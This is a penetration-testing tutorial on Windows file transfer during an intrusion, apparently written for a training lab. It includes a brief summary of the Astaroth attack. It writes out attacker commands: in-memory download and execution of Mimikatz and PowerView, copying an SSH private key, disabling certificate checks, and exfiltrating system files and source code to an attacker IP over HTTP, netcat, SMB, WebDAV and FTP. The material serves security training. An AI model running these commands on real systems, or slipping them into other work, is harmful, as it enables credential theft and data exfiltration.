# Windows File Transfer Methods

The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.

Let's use the Microsoft Astaroth Attack blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking about fileless threats. The term fileless suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool.

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The regsvr32 tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process.

We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.
An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

- Pwnbox Check SSH Key MD5 Hash: Pwnbox Check SSH Key MD5 Hash
- Pwnbox Encode SSH Key to Base64: `cat id_rsa | base64 -w 0;echo`

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
`[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64")`

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.
PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

- OpenRead: Returns the data from a resource as a Stream;
- OpenReadAsync: Returns the data from a resource without blocking the calling thread;
- DownloadData: Downloads data from a resource and returns a Byte array;
- DownloadDataAsync: Downloads data from a resource and returns a Byte array without blocking the calling thread;
- DownloadFile: Downloads data from a resource to a local file;
- DownloadFileAsync: Downloads data from a resource to a local file without blocking the calling thread;
- DownloadString: Downloads a String from a resource and returns a String;
- DownloadStringAsync: Downloads a String from a resource without blocking the calling thread.



## File Download

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

- `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`

## PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`

IEX also accepts pipeline input.

- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

## PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`

## Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing.

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

## Create the SMB Server

`sudo impacket-smbserver share -smb2support /tmp/smbshare`

## Copy a File from the SMB Server

`copy \\192.168.220.133\share\nc.exe`

New versions of Windows block unauthenticated guest access. To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

## Create the SMB Server with a Username and Password

`sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

## Mount the SMB Server with Username and Password

`net use n: \\192.168.220.133\share /user:test test`

## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:

 `sudo pip3 install pyftpdlib`
 
Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

## Setting up a Python3 FTP Server

`sudo python3 -m pyftpdlib --port 21`
 
## Transfering Files from an FTP Server Using PowerShell

`New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')`

## Create a Command File for the FTP Client and Download the Target File

`echo open 192.168.49.128 > ftpcommand.txt`
`echo USER anonymous >> ftpcommand.txt`
`echo binary >> ftpcommand.txt`
`echo GET file.txt >> ftpcommand.txt`
`echo bye >> ftpcommand.txt`


## Upload Operationswindows file transfer methods

There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for Uploads. Let's see how we can accomplish uploading files in various ways.

## PowerShell Base64 Encode & Decode

We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

## Encode File Using PowerShell

`[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
`Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`

We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.

## Decode Base64 String in Linux

- `echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts`

- `md5sum hosts`

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. Let's install it and start the webserver.

## Installing a Configured WebServer with Upload

`pip3 install uploadserver`

`python3 -m uploadserver`

Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

## PowerShell Script to Upload a File to Python Upload Server

`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
`Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

## PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

`$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
`Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

- `nc -lvnp 8000`
- `echo <base64> | base64 -d -w 0 > hosts`

## SMB Uploads

We previously discussed that companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post Preventing SMB traffic from lateral connections and entering or leaving the network.

An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.

## Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot (you can read more about this implementation here: wsgidav github). After installing them, we run the wsgidav application in the target directory.

## Installing WebDav Python modules

`sudo pip install wsgidav cheroot`

## Using the WebDav Python module

`sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

## Connecting to the Webdav Share

Now we can attempt to connect to the share using the DavWWWRoot directory.

`dir \\192.168.49.128\DavWWWRoot`

*Note*: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

## Uploading Files using SMB
`copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`

## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.

`sudo python3 -m pyftpdlib --port 21 --write`

Now let's use the PowerShell upload function to upload a file to our FTP Server.

## PowerShell Upload File

`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

## Create a Command File for the FTP Client to Upload a File

- `echo open 192.168.49.128 > ftpcommand.txt`
- `echo USER anonymous >> ftpcommand.txt`
- `echo binary >> ftpcommand.txt`
- `echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt`
- `echo bye >> ftpcommand.txt`
- `ftp -v -n -s:ftpcommand.txt`

